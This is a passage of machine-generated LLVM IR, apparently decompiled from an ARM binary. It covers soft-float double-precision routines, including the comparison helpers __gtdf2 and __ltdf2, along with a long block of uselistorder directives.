.thread12:                                        ; preds = %bb103, %bb104, %bb105
  %v1_1aab0 = phi i1 [ %v3_1aaa4, %bb103 ], [ %v4_1aaa8, %bb104 ], [ %v3_1aaac, %bb105 ]
  %v0_1aab0 = load i32, i32* %r0.global-to-local, align 4
  %v2_1aab0 = zext i1 %v1_1aab0 to i32
  %v3_1aab0 = add i32 %v2_1aab0, %v0_1aab0
  store i32 %v3_1aab0, i32* %r0.global-to-local, align 4
  %v0_1aab4 = load i32, i32* %r1.global-to-local, align 4
  %v1_1aab4 = load i32, i32* %r4.global-to-local, align 4
  %v2_1aab4 = and i32 %v1_1aab4, 4096
  %v3_1aab4 = icmp ne i32 %v2_1aab4, 0
  %v4_1aab4 = mul i32 %v1_1aab4, 1048576
  %v6_1aab4 = add i32 %v4_1aab4, %v0_1aab4
  %v7_1aab4 = zext i1 %v3_1aab4 to i32
  %v8_1aab4 = add i32 %v7_1aab4, %v6_1aab4
  store i32 %v8_1aab4, i32* %r1.global-to-local, align 4
  %v2_1aab8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1aab8, i32* %r4.global-to-local, align 4
  store i32 %v6_1a958, i32* %r5.global-to-local, align 4
  store i32 %v9_1a958, i32* %r6.global-to-local, align 4
  ret i32 %v3_1aab0

dec_label_pc_1aac0:                               ; preds = %dec_label_pc_1a978
  %v1_1aac0 = and i32 %v2_1a97c, -2147483648
  %v4_1aac4 = urem i32 %v1_1a964, 1048576
  %v5_1aac4 = or i32 %v1_1aac0, %v4_1aac4
  store i32 %v5_1aac4, i32* %r1.global-to-local, align 4
  %v6_1aac8 = add nsw i32 %v2_1a978, 1023
  store i32 %v6_1aac8, i32* %r4.global-to-local, align 4
  %v8_1aac8 = sub nsw i32 0, %v2_1a978
  %v9_1aac8 = and i32 %v6_1aac8, %v8_1aac8
  %v11_1aac8 = icmp slt i32 %v2_1a978, -1023
  %v12_1aac8 = icmp eq i32 %v6_1aac8, 0
  %v7_1aacc = icmp sgt i32 %v2_1a978, -1023
  br i1 %v7_1aacc, label %bb106, label %bb107

bb106:                                            ; preds = %dec_label_pc_1aac0
  %v10_1aacc = sub nsw i32 1024, %v2_1a978
  store i32 %v10_1aacc, i32* %r5.global-to-local, align 4
  %v14_1aacc = and i32 %v10_1aacc, %v6_1aac8
  %v16_1aacc = icmp slt i32 %v10_1aacc, 0
  %v17_1aacc = icmp eq i32 %v6_1aac8, 2047
  br label %bb107

bb107:                                            ; preds = %dec_label_pc_1aac0, %bb106
  %v3_1aad8.in = phi i32 [ %v9_1aac8, %dec_label_pc_1aac0 ], [ %v14_1aacc, %bb106 ]
  %v2_1aad8 = phi i1 [ %v11_1aac8, %dec_label_pc_1aac0 ], [ %v16_1aacc, %bb106 ]
  %v1_1aad8 = phi i1 [ %v12_1aac8, %dec_label_pc_1aac0 ], [ %v17_1aacc, %bb106 ]
  %v3_1aad8 = icmp slt i32 %v3_1aad8.in, 0
  %v3_1aad0 = xor i1 %v3_1aad8, %v2_1aad8
  %v4_1aad0 = or i1 %v1_1aad8, %v3_1aad0
  br i1 %v4_1aad0, label %.thread, label %bb108

bb108:                                            ; preds = %bb107
  %v9_1aad084 = mul i32 %v6_1aac8, 1048576
  %v10_1aad085 = or i32 %v9_1aad084, %v5_1aac4
  store i32 %v10_1aad085, i32* %r1.global-to-local, align 4
  store i32 %v3_1a958, i32* %r4.global-to-local, align 4
  store i32 %v6_1a958, i32* %r5.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %bb107, %bb108
  %v0_1aad8 = phi i32 [ %v12_1a958, %bb108 ], [ %v1_1aac0, %bb107 ]
  %v6_1aad8 = xor i1 %v4_1aad0, true
  call void @__pseudo_cond_branch(i1 %v6_1aad8, i32 %v0_1aad8)
  %v0_1aadc = load i32, i32* %r1.global-to-local, align 4
  %v1_1aadc = or i32 %v0_1aadc, 1048576
  store i32 %v1_1aadc, i32* @r1, align 4
  %v0_1aae4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1aae4 = add i32 %v0_1aae4, -1
  store i32 %v1_1aae4, i32* @r4, align 4
  %v3_1aae4 = sub i32 0, %v0_1aae4
  %v4_1aae4 = and i32 %v0_1aae4, %v3_1aae4
  %v5_1aae4 = icmp slt i32 %v4_1aae4, 0
  store i1 %v5_1aae4, i1* @cpsr_v, align 1
  %v6_1aae4 = icmp slt i32 %v1_1aae4, 0
  store i1 %v6_1aae4, i1* @cpsr_n, align 1
  %v7_1aae4 = icmp eq i32 %v0_1aae4, 1
  store i1 %v7_1aae4, i1* @cpsr_z, align 1
  %v0_1aae8 = call i32 @function_1a7b4()
  store i32 %v0_1aae8, i32* @r0, align 4
  %v0_1aaf0 = call i32 @function_1a7b4()
  store i32 %v0_1aaf0, i32* @r0, align 4
  %v0_1aaf4.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_1aaf8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1aaf4

dec_label_pc_1aaf4:                               ; preds = %.thread1, %.thread2, %bb91, %.thread
  %v4_1aaf4.pre-phi = phi i32 [ %v5_1a968, %.thread1 ], [ %.pre145.pre-phi, %.thread2 ], [ %v5_1a968, %bb91 ], [ %v5_1a968, %.thread ]
  %v0_1aaf8 = phi i32 [ %v5_1a964, %.thread1 ], [ %v5_1a964, %.thread2 ], [ %v5_1a964, %bb91 ], [ %v0_1aaf8.pre, %.thread ]
  %v2_1aafc = phi i32 [ 2047, %.thread1 ], [ 2047, %.thread2 ], [ 2047, %bb91 ], [ %v0_1aaf4.pre, %.thread ]
  %v5_1aaf4 = and i32 %v2_1aafc, %v4_1aaf4.pre-phi
  store i32 %v5_1aaf4, i32* @r5, align 4
  %v4_1aaf8 = icmp eq i32 %v2_1aafc, %v0_1aaf8
  br i1 %v4_1aaf8, label %bb109, label %bb110

bb109:                                            ; preds = %dec_label_pc_1aaf4
  %v5_1aafc = icmp eq i32 %v5_1aaf4, %v2_1aafc
  br label %bb110

bb110:                                            ; preds = %dec_label_pc_1aaf4, %bb109
  %v0_1ab00 = phi i1 [ false, %dec_label_pc_1aaf4 ], [ %v5_1aafc, %bb109 ]
  call void @__pseudo_cond_branch(i1 %v0_1ab00, i32 ptrtoint (i32* @global_var_1a948.983 to i32))
  %v0_1ab04 = load i32, i32* @r4, align 4
  %v1_1ab04 = load i32, i32* %ip.global-to-local, align 4
  %v4_1ab04 = icmp eq i32 %v1_1ab04, %v0_1ab04
  br i1 %v4_1ab04, label %dec_label_pc_1ab0c, label %dec_label_pc_1ab28

dec_label_pc_1ab0c:                               ; preds = %bb110
  %v0_1ab0c = load i32, i32* @r0, align 4
  %v1_1ab0c = load i32, i32* @r1, align 4
  %v4_1ab0c = mul i32 %v1_1ab0c, 4096
  %v5_1ab0c = or i32 %v4_1ab0c, %v0_1ab0c
  store i32 %v5_1ab0c, i32* %r4.global-to-local, align 4
  %v1_1ab10 = icmp ne i32 %v5_1ab0c, 0
  call void @__pseudo_cond_branch(i1 %v1_1ab10, i32 ptrtoint (i32* @global_var_1a948.983 to i32))
  %v0_1ab14 = load i32, i32* @r5, align 4
  %v1_1ab14 = load i32, i32* %ip.global-to-local, align 4
  %v1_1ab18 = icmp ne i32 %v1_1ab14, %v0_1ab14
  call void @__pseudo_cond_branch(i1 %v1_1ab18, i32 ptrtoint (i32* @global_var_1a92c.984 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_1ab24 = call i32 @function_1a948(i32 %arg3, i32 %arg4)
  store i32 %v2_1ab24, i32* @r0, align 4
  %v1_1ab28.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1ab28

dec_label_pc_1ab28:                               ; preds = %bb110, %dec_label_pc_1ab0c
  %v1_1ab28 = phi i32 [ %v1_1ab04, %bb110 ], [ %v1_1ab28.pre, %dec_label_pc_1ab0c ]
  %v0_1ab28 = load i32, i32* @r5, align 4
  %v4_1ab28 = icmp eq i32 %v0_1ab28, %v1_1ab28
  br i1 %v4_1ab28, label %dec_label_pc_1ab30, label %dec_label_pc_1ab28.dec_label_pc_1ab44_crit_edge

dec_label_pc_1ab28.dec_label_pc_1ab44_crit_edge:  ; preds = %dec_label_pc_1ab28
  %v0_1ab44.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1ab44

dec_label_pc_1ab30:                               ; preds = %dec_label_pc_1ab28
  %v4_1ab30 = mul i32 %arg4, 4096
  %v5_1ab30 = or i32 %v4_1ab30, %arg3
  store i32 %v5_1ab30, i32* %r5.global-to-local, align 4
  %v7_1ab30 = icmp eq i32 %v5_1ab30, 0
  call void @__pseudo_cond_branch(i1 %v7_1ab30, i32 ptrtoint (i32* @global_var_1a8dc.985 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_1ab40 = call i32 @function_1a948(i32 %arg3, i32 %arg4)
  store i32 %v2_1ab40, i32* @r0, align 4
  br label %dec_label_pc_1ab44

dec_label_pc_1ab44:                               ; preds = %dec_label_pc_1ab28.dec_label_pc_1ab44_crit_edge, %dec_label_pc_1ab30
  %v0_1ab44 = phi i32 [ %v0_1ab44.pre, %dec_label_pc_1ab28.dec_label_pc_1ab44_crit_edge ], [ %v2_1ab40, %dec_label_pc_1ab30 ]
  %v1_1ab44 = load i32, i32* @r1, align 4
  %v3_1ab44 = mul i32 %v1_1ab44, 2
  %v4_1ab44 = or i32 %v3_1ab44, %v0_1ab44
  store i32 %v4_1ab44, i32* %r6.global-to-local, align 4
  %v6_1ab44 = icmp eq i32 %v4_1ab44, 0
  br i1 %v6_1ab44, label %dec_label_pc_1ab44._crit_edge, label %bb111

dec_label_pc_1ab44._crit_edge:                    ; preds = %dec_label_pc_1ab44
  %.pre = mul i32 %arg4, 2
  %.pre80 = or i32 %.pre, %arg3
  br label %bb112

bb111:                                            ; preds = %dec_label_pc_1ab44
  %v4_1ab48 = mul i32 %arg4, 2
  %v5_1ab48 = or i32 %v4_1ab48, %arg3
  store i32 %v5_1ab48, i32* %r6.global-to-local, align 4
  %phitmp = icmp ne i32 %v5_1ab48, 0
  br label %bb112

bb112:                                            ; preds = %dec_label_pc_1ab44._crit_edge, %bb111
  %v4_1ab58.pre-phi = phi i32 [ %.pre80, %dec_label_pc_1ab44._crit_edge ], [ %v5_1ab48, %bb111 ]
  %v0_1ab4c = phi i1 [ false, %dec_label_pc_1ab44._crit_edge ], [ %phitmp, %bb111 ]
  call void @__pseudo_cond_branch(i1 %v0_1ab4c, i32 ptrtoint (i32* @global_var_1a874.986 to i32))
  %v0_1ab50 = load i32, i32* @r0, align 4
  %v1_1ab50 = load i32, i32* @r1, align 4
  %v3_1ab50 = mul i32 %v1_1ab50, 2
  %v4_1ab50 = or i32 %v3_1ab50, %v0_1ab50
  store i32 %v4_1ab50, i32* %r4.global-to-local, align 4
  %v1_1ab54 = icmp ne i32 %v4_1ab50, 0
  call void @__pseudo_cond_branch(i1 %v1_1ab54, i32 ptrtoint (i32* @global_var_1a92c.984 to i32))
  store i32 %v4_1ab58.pre-phi, i32* %r5.global-to-local, align 4
  %v1_1ab5c = icmp ne i32 %v4_1ab58.pre-phi, 0
  call void @__pseudo_cond_branch(i1 %v1_1ab5c, i32 ptrtoint (i32* @global_var_1a8dc.985 to i32))
  %v0_1ab60 = load i32, i32* @r0, align 4
  %v1_1ab60 = load i32, i32* @r1, align 4
  %v2_1ab60 = call i32 @function_1a948(i32 %v0_1ab60, i32 %v1_1ab60)
  store i32 %v2_1ab60, i32* %r0.global-to-local, align 4
  ret i32 %v2_1ab60

; uselistorder directives
  uselistorder i32 %v5_1ab48, { 1, 0, 2 }
  uselistorder i32 %v1_1ab04, { 1, 0 }
  uselistorder i32 %v1_1aae4, { 1, 0 }
  uselistorder i32 %v0_1aae4, { 3, 1, 0, 2 }
  uselistorder i32 %v10_1aacc, { 2, 0, 1 }
  uselistorder i32 %v6_1aac8, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_1aac0, { 1, 0 }
  uselistorder i32 %v2_1aaa8, { 1, 0, 2 }
  uselistorder i32 %v1_1aaa8, { 1, 0, 2 }
  uselistorder i32 %v1_1aaa4, { 1, 0, 2 }
  uselistorder i32 %v0_1aaa4, { 1, 0, 2 }
  uselistorder i1 %v7_1aa98, { 1, 0 }
  uselistorder i32 %v2_1aa7c, { 1, 0 }
  uselistorder i32 %v3_1aa68, { 2, 1, 0 }
  uselistorder i32 %v3_1aa5c, { 0, 2, 1 }
  uselistorder i32 %v5_1aa58, { 2, 0, 1 }
  uselistorder i32 %v6_1aa48, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1aa34, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_1aa30, { 3, 0, 2, 1 }
  uselistorder i32 %v0_1aa3c, { 0, 2, 1 }
  uselistorder i32 %v1_1aa48, { 1, 0 }
  uselistorder i32 %v6_1aa2c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1aa18, { 1, 2, 0, 3 }
  uselistorder i32 %v3_1aa14, { 0, 2, 1 }
  uselistorder i32 %v0_1aa20, { 0, 2, 1 }
  uselistorder i32 %v1_1aa2c, { 1, 0 }
  uselistorder i32 %v6_1aa10, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1a9fc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1aa04, { 0, 2, 1 }
  uselistorder i32 %v1_1aa10, { 1, 0 }
  uselistorder i32 %v3_1a9f4, { 2, 1, 0, 3, 4 }
  uselistorder i1 %v3_1a9e8, { 1, 2, 0 }
  uselistorder i32 %v3_1aa6813, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_1aa6417, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v0_1a9e8, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1a9f4, { 1, 0 }
  uselistorder i32 %storemerge133, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_1aa90.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1a9d4, { 1, 0 }
  uselistorder i32 %v0_1a9d8, { 1, 0 }
  uselistorder i32 %v3_1a9c4, { 1, 0 }
  uselistorder i1 %v1_1a9b8, { 1, 0 }
  uselistorder i32 %v3_1a9a8, { 2, 3, 1, 0 }
  uselistorder i32 %v5_1a9a4, { 3, 2, 1, 0 }
  uselistorder i32 %v3_1a99c, { 2, 1, 0 }
  uselistorder i32 %v5_1a998, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_1a978, { 3, 1, 2, 0, 4, 7, 6, 5, 8 }
  uselistorder i32 %v6_1a968, { 2, 3, 1, 0 }
  uselistorder i32 %v5_1a968, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_1a964, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 %v1_1a964, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_1a958, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r2.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0, 4, 5, 8, 6, 7, 9, 10 }
  uselistorder i32* %r0.global-to-local, { 9, 1, 6, 7, 2, 3, 4, 5, 8, 0 }
  uselistorder i32* %ip.global-to-local, { 6, 8, 9, 7, 0, 1, 2, 3, 4, 5, 10 }
  uselistorder i32 (i32, i32)* @function_1a948, { 2, 1, 0 }
  uselistorder i32 ()* @function_1a7b4, { 1, 0 }
  uselistorder i32 1024, { 2, 0, 11, 12, 3, 13, 1, 14, 15, 16, 5, 9, 10, 4, 8, 7, 6, 17 }
  uselistorder i32 536870912, { 2, 3, 0, 4, 1 }
  uselistorder i32 16, { 1, 9, 7, 8, 10, 11, 26, 12, 13, 2, 14, 15, 30, 131, 132, 139, 141, 16, 142, 17, 145, 146, 43, 147, 149, 166, 167, 168, 32, 31, 44, 169, 18, 170, 171, 154, 155, 109, 110, 45, 94, 95, 96, 97, 143, 144, 90, 91, 92, 93, 140, 3, 46, 172, 173, 174, 175, 37, 38, 39, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 156, 160, 161, 133, 47, 134, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 157, 40, 122, 135, 136, 48, 49, 137, 138, 98, 99, 50, 100, 51, 52, 53, 33, 148, 41, 101, 178, 102, 54, 55, 56, 57, 58, 60, 61, 150, 151, 152, 153, 62, 180, 181, 0, 182, 183, 59, 63, 164, 28, 162, 163, 5, 4, 34, 64, 65, 66, 67, 68, 69, 123, 124, 125, 126, 127, 128, 85, 158, 159, 103, 70, 71, 165, 19, 72, 73, 20, 27, 21, 22, 6, 23, 24, 35, 74, 75, 104, 105, 106, 107, 76, 108, 77, 42, 86, 78, 129, 79, 87, 88, 80, 89, 130, 29, 36, 81, 176, 177, 82, 179, 25, 83, 84 }
  uselistorder i32 8, { 0, 1, 2, 3, 4, 5, 64, 65, 33, 6, 7, 22, 8, 133, 134, 141, 143, 144, 145, 146, 9, 147, 149, 150, 151, 152, 153, 34, 75, 50, 51, 66, 162, 163, 164, 165, 29, 98, 76, 77, 78, 79, 148, 142, 180, 181, 186, 235, 42, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 166, 99, 100, 101, 102, 103, 104, 105, 106, 107, 10, 43, 108, 40, 109, 110, 67, 111, 112, 167, 168, 169, 135, 136, 137, 138, 139, 140, 80, 81, 82, 83, 52, 253, 254, 35, 84, 11, 131, 183, 85, 86, 31, 187, 188, 189, 190, 191, 192, 193, 194, 12, 56, 195, 196, 197, 198, 199, 200, 201, 202, 13, 154, 155, 156, 157, 158, 159, 160, 161, 203, 204, 205, 206, 14, 207, 208, 15, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 226, 219, 220, 221, 222, 57, 24, 223, 224, 225, 58, 59, 16, 227, 228, 229, 230, 232, 233, 60, 17, 234, 18, 231, 175, 46, 47, 44, 45, 25, 26, 37, 38, 48, 255, 174, 170, 171, 113, 114, 68, 115, 116, 117, 118, 30, 119, 61, 62, 120, 121, 122, 49, 123, 124, 125, 126, 27, 28, 127, 128, 129, 63, 172, 173, 87, 176, 32, 177, 178, 179, 53, 69, 36, 19, 20, 23, 21, 88, 89, 90, 54, 91, 92, 93, 94, 55, 95, 96, 97, 70, 130, 71, 72, 73, 74, 41, 39, 132, 182, 184, 185 }
  uselistorder i32 4, { 5, 6, 187, 262, 263, 188, 7, 8, 267, 268, 269, 270, 271, 69, 272, 273, 281, 283, 284, 101, 285, 286, 287, 81, 288, 291, 126, 292, 293, 294, 295, 296, 297, 9, 298, 127, 102, 299, 128, 0, 1, 129, 302, 324, 325, 104, 103, 326, 130, 131, 132, 133, 327, 328, 106, 329, 105, 330, 83, 225, 226, 227, 315, 316, 201, 202, 289, 290, 196, 197, 198, 199, 200, 282, 10, 331, 11, 332, 339, 274, 12, 13, 14, 221, 15, 16, 228, 17, 100, 95, 96, 18, 398, 97, 399, 86, 19, 20, 98, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 21, 417, 418, 419, 420, 421, 422, 85, 423, 424, 425, 426, 427, 428, 22, 23, 99, 429, 318, 107, 229, 230, 231, 232, 233, 234, 235, 236, 237, 82, 238, 239, 240, 241, 242, 317, 243, 134, 275, 276, 277, 278, 279, 280, 24, 203, 204, 205, 206, 25, 207, 430, 135, 108, 136, 431, 26, 432, 137, 195, 342, 343, 344, 90, 345, 138, 27, 208, 139, 209, 140, 87, 210, 264, 141, 265, 266, 334, 335, 336, 337, 142, 143, 211, 144, 145, 212, 28, 213, 214, 84, 88, 348, 349, 350, 351, 352, 353, 146, 147, 29, 354, 355, 356, 357, 358, 359, 360, 361, 148, 346, 347, 303, 304, 305, 306, 307, 308, 309, 310, 311, 30, 312, 313, 314, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 149, 150, 151, 376, 377, 380, 383, 378, 379, 109, 152, 381, 70, 382, 384, 385, 386, 388, 153, 32, 31, 387, 154, 155, 156, 340, 319, 397, 33, 34, 35, 36, 2, 244, 37, 38, 157, 71, 39, 40, 215, 158, 41, 159, 160, 161, 162, 245, 246, 42, 247, 163, 248, 249, 250, 111, 251, 252, 110, 164, 253, 254, 255, 256, 257, 258, 72, 165, 259, 261, 166, 167, 260, 189, 320, 43, 321, 112, 322, 323, 300, 301, 389, 390, 190, 44, 45, 46, 47, 73, 48, 49, 50, 74, 51, 52, 168, 53, 216, 113, 217, 218, 219, 220, 222, 91, 223, 92, 224, 54, 93, 94, 55, 191, 169, 75, 115, 192, 170, 171, 172, 173, 119, 174, 175, 117, 114, 193, 118, 56, 176, 116, 57, 194, 125, 58, 59, 89, 177, 120, 333, 178, 76, 77, 60, 61, 62, 122, 121, 123, 78, 179, 124, 63, 64, 79, 180, 338, 181, 80, 182, 183, 65, 341, 66, 67, 68, 391, 392, 393, 394, 395, 396, 184, 185, 186, 3, 4 }
  uselistorder i32 32, { 95, 96, 97, 98, 30, 31, 39, 82, 83, 33, 34, 99, 32, 40, 100, 101, 102, 103, 37, 104, 117, 119, 120, 131, 47, 84, 132, 121, 122, 85, 86, 87, 88, 118, 133, 41, 35, 105, 48, 22, 106, 107, 49, 123, 124, 43, 42, 51, 55, 52, 56, 53, 57, 54, 58, 59, 125, 126, 60, 68, 69, 67, 70, 71, 72, 73, 74, 75, 62, 63, 1, 64, 2, 65, 4, 3, 61, 66, 50, 76, 134, 6, 5, 8, 7, 10, 9, 36, 129, 127, 128, 108, 109, 21, 110, 0, 77, 111, 112, 113, 114, 115, 116, 23, 89, 90, 130, 135, 78, 91, 79, 38, 92, 93, 94, 12, 11, 24, 44, 80, 25, 14, 13, 16, 15, 26, 18, 17, 27, 28, 20, 19, 29, 45, 46, 81 }
  uselistorder i32 33, { 4, 5, 6, 3, 7, 8, 9, 0, 2, 1 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder i32 268435456, { 1, 2, 3, 0, 4, 5, 6, 7 }
  uselistorder i32 16777216, { 0, 1, 3, 2, 5, 4, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 84, 13, 14, 15, 83, 95, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 88, 56, 89, 57, 90, 58, 91, 92, 59, 60, 61, 62, 63, 64, 65, 0, 86, 1, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 82, 93, 76, 81, 87, 94, 80, 77, 85, 78, 79 }
  uselistorder i32 1048576, { 20, 0, 1, 2, 21, 22, 13, 3, 4, 5, 23, 6, 7, 24, 25, 16, 17, 8, 9, 26, 27, 28, 19, 29, 10, 14, 11, 18, 12, 30, 15, 31 }
  uselistorder i32 2047, { 5, 6, 7, 2, 0, 3, 8, 1, 4, 9 }
  uselistorder i32* @r6, { 73, 74, 75, 76, 124, 125, 4, 126, 127, 128, 129, 145, 146, 147, 148, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 187, 188, 189, 190, 191, 192, 193, 205, 206, 207, 25, 219, 220, 221, 222, 6, 5, 31, 32, 33, 34, 35, 36, 223, 224, 7, 225, 226, 227, 228, 229, 230, 231, 149, 150, 151, 152, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 130, 8, 131, 132, 77, 78, 79, 80, 9, 81, 82, 83, 84, 85, 86, 87, 133, 134, 135, 136, 10, 11, 137, 138, 139, 140, 141, 142, 143, 144, 37, 38, 39, 40, 41, 42, 43, 44, 12, 13, 14, 288, 289, 290, 291, 292, 293, 2, 294, 295, 26, 15, 27, 16, 28, 286, 287, 45, 46, 47, 120, 121, 122, 123, 48, 49, 50, 51, 52, 53, 254, 258, 259, 260, 261, 255, 256, 257, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 262, 263, 264, 265, 266, 17, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 282, 284, 278, 279, 280, 281, 283, 285, 56, 57, 3, 58, 249, 250, 251, 252, 253, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 18, 208, 209, 59, 19, 60, 61, 210, 20, 211, 212, 99, 21, 24, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 1, 115, 22, 29, 100, 0, 101, 102, 54, 55, 213, 214, 23, 215, 216, 217, 218, 116, 117, 118, 119, 178, 179, 180, 181, 182, 183, 184, 185, 186, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 246, 247, 248, 30 }
  uselistorder i32* @r5, { 126, 127, 128, 129, 130, 131, 132, 133, 134, 54, 55, 56, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 246, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 1, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 8, 287, 288, 289, 290, 291, 344, 299, 300, 301, 302, 303, 304, 305, 28, 306, 307, 308, 325, 361, 362, 9, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 10, 378, 377, 30, 379, 380, 381, 382, 383, 57, 58, 59, 60, 61, 62, 63, 384, 385, 386, 387, 388, 389, 394, 395, 390, 391, 392, 393, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 11, 157, 158, 64, 65, 66, 67, 68, 69, 70, 71, 72, 247, 248, 249, 250, 251, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 345, 346, 347, 348, 450, 451, 452, 224, 33, 225, 5, 226, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 326, 327, 31, 328, 227, 228, 229, 230, 159, 2, 160, 161, 162, 163, 164, 165, 231, 14, 232, 233, 12, 234, 235, 236, 237, 238, 239, 13, 240, 241, 242, 243, 244, 245, 73, 15, 74, 75, 76, 77, 34, 78, 16, 79, 80, 81, 82, 83, 465, 17, 466, 467, 477, 43, 44, 45, 46, 47, 48, 49, 468, 469, 470, 471, 472, 84, 85, 86, 87, 88, 89, 90, 91, 92, 210, 211, 212, 93, 94, 95, 96, 18, 19, 473, 474, 475, 476, 97, 98, 99, 100, 418, 419, 423, 424, 425, 426, 427, 420, 421, 422, 309, 310, 311, 20, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 7, 441, 442, 443, 444, 445, 21, 446, 447, 448, 449, 105, 106, 107, 108, 109, 408, 409, 410, 411, 415, 416, 22, 417, 349, 23, 350, 351, 352, 166, 24, 167, 35, 168, 169, 170, 171, 172, 173, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 110, 111, 112, 113, 114, 339, 340, 341, 342, 343, 174, 175, 177, 176, 178, 179, 25, 180, 181, 182, 183, 184, 185, 186, 32, 187, 188, 192, 6, 193, 3, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 50, 51, 52, 189, 190, 191, 102, 101, 29, 103, 104, 353, 354, 355, 356, 357, 358, 26, 359, 360, 204, 205, 206, 207, 208, 209, 292, 293, 294, 295, 296, 27, 297, 298, 115, 116, 4, 0, 117, 118, 119, 120, 121, 122, 123, 124, 125, 36, 37, 38, 39, 40, 41, 42, 412, 413, 414, 53 }
  uselistorder i32 %arg4, { 0, 1, 9, 8, 2, 11, 10, 3, 4, 7, 5, 6, 12 }
  uselistorder i32 %arg3, { 2, 3, 9, 8, 4, 7, 6, 0, 1, 5, 10 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %dec_label_pc_1ab44, { 1, 0 }
  uselistorder label %dec_label_pc_1ab28, { 1, 0 }
  uselistorder label %bb110, { 1, 0 }
  uselistorder label %dec_label_pc_1aaf4, { 3, 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb107, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread11, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_1a9e4, { 1, 0 }
  uselistorder label %dec_label_pc_1a9cc, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__gtdf2() local_unnamed_addr {
entry:
  store i32 -1, i32* @ip, align 4
  %v0_1ab68 = call i32 @function_1ab78()
  ret i32 %v0_1ab68
}

define i32 @__ltdf2() local_unnamed_addr {
entry:
  store i32 1, i32* @ip, align 4
  %v0_1ab70 = call i32 @function_1ab78()
  ret i32 %v0_1ab70

; uselistorder directives
